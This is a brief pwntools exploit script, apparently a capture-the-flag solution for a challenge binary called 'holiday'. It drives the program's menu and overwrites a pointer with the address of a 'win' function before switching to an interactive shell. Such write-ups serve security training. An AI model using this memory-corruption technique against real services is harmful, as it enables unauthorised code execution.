#!/usr/bin/env python3

from pwn import *

exe = ELF("holiday")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7004)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    r.sendline(b"1")
    r.sendline(b"0")

    r.sendline(b"2")
    r.sendline(b"0")

    r.sendline(b"3")
    r.sendline(b"9")
    r.send(p64(exe.symbols['win']))

    r.sendline(b"2")
    r.sendline(b"0")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

